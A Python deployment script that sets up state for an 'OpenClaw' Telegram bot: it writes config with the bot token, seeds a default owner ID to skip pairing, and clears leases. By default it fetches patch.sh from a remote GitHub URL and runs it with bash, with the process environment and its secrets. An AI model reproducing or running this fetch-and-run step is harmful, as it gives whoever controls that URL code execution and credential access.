#!/usr/bin/env python3
"""Prepare OpenClaw state on a fresh machine (GitHub Actions runner or VPS).

- writes config + AGENTS.md
- seeds the Telegram owner allow-entry so the bot answers the owner without
  interactive pairing (a fresh state would otherwise ask for a pairing code
  that nobody can approve on a runner)
- clears stale gateway leases so the new machine can take ownership
- optionally runs patch.sh from the repo, so runner behaviour can be changed
  later without editing the workflow file

Env: TELEGRAM_BOT_TOKEN (required), GOOGLE_API_KEY (optional)
Args: --claw DIR --editor DIR [--owner-id ID] [--no-seed] [--no-patch]
"""
import argparse, json, os, secrets, sqlite3, subprocess, sys, time, urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("--claw", required=True)
ap.add_argument("--editor", required=True)
ap.add_argument("--template", default=None)
ap.add_argument("--owner-id", default="7473905437")
ap.add_argument("--seed-db", action="store_true", help="boot a temp gateway to create the state DB (not needed with config allowFrom)")
ap.add_argument("--no-patch", action="store_true")
a = ap.parse_args()

tg = os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
if not tg:
    sys.exit("TELEGRAM_BOT_TOKEN is not set")

here = os.path.dirname(os.path.abspath(__file__))
state_dir = os.path.join(a.claw, "state")
ws_dir = os.path.join(a.claw, "workspace")
os.makedirs(state_dir, exist_ok=True)
os.makedirs(ws_dir, exist_ok=True)

# ---- config ----------------------------------------------------------------
cfg_text = open(a.template or os.path.join(here, "config.template.json"), encoding="utf-8").read()
cfg_text = (cfg_text.replace("__CLAW__", a.claw)
                    .replace("__EDITOR__", a.editor)
                    .replace("__TELEGRAM_TOKEN__", tg)
                    .replace("__GATEWAY_TOKEN__", secrets.token_hex(12)))
cfg = json.loads(cfg_text)
cfg.setdefault("agents", {}).setdefault("defaults", {})["workspace"] = ws_dir
out = os.path.join(state_dir, "openclaw.json")
json.dump(cfg, open(out, "w", encoding="utf-8"), indent=2)
os.chmod(out, 0o600)

md = open(os.path.join(here, "AGENTS.md.template"), encoding="utf-8").read().replace("__EDITOR__", a.editor)
open(os.path.join(ws_dir, "AGENTS.md"), "w", encoding="utf-8").write(md)
print("config:", out)

# ---- owner seed ------------------------------------------------------------
db = os.path.join(state_dir, "state", "openclaw.sqlite")


def have_schema(path):
    try:
        c = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
        names = {r[0] for r in c.execute("select name from sqlite_master where type='table'")}
        c.close()
        return "channel_pairing_allow_entries" in names
    except Exception:
        return False


def patch_db(path, owner_id):
    c = sqlite3.connect(path)
    c.execute("insert or replace into channel_pairing_allow_entries"
              "(channel_key,account_id,entry,sort_order,updated_at) values('telegram','default',?,0,?)",
              (owner_id, int(time.time() * 1000)))
    for t in ("state_leases", "agent_database_leases", "gateway_boot_lifecycle", "gateway_restart_sentinel"):
        try:
            c.execute(f"delete from {t}")
        except sqlite3.Error:
            pass
    c.commit()
    n = c.execute("select count(*) from channel_pairing_allow_entries where entry=?", (owner_id,)).fetchone()[0]
    c.close()
    return n


if a.seed_db and a.owner_id:
    env = os.environ.copy()
    env["OPENCLAW_STATE_DIR"] = state_dir
    env["OPENCLAW_CONFIG_PATH"] = out
    if not have_schema(db):
        print("seeding fresh state (boots a temporary gateway to create the schema)")
        p = subprocess.Popen(["openclaw", "gateway", "run"], env=env,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                             start_new_session=True)
        for _ in range(90):
            if have_schema(db):
                break
            time.sleep(1)
        p.terminate()
        try:
            p.wait(timeout=30)
        except subprocess.TimeoutExpired:
            p.kill()
        time.sleep(2)
    if have_schema(db):
        print("owner allow-entries:", patch_db(db, a.owner_id))
    else:
        print("WARN: state schema not created, pairing seed skipped")

# ---- optional patch hook ---------------------------------------------------
PATCH_URL = "https://raw.githubusercontent.com/harixali96-beep/claw24/main/patch.sh"
if not a.no_patch:
    try:
        req = urllib.request.Request(PATCH_URL, headers={"User-Agent": "claw-setup"})
        body = urllib.request.urlopen(req, timeout=20).read()
        if body.strip():
            path = os.path.join(a.claw, "patch.sh")
            open(path, "wb").write(body)
            os.chmod(path, 0o755)
            r = subprocess.run(["bash", path], env={**os.environ, "CLAW": a.claw, "EDITOR": a.editor},
                               capture_output=True, text=True, timeout=300)
            print("patch.sh exit", r.returncode, (r.stdout or "")[-400:])
    except Exception as e:
        print("no patch applied:", type(e).__name__)

print("workspace:", ws_dir)
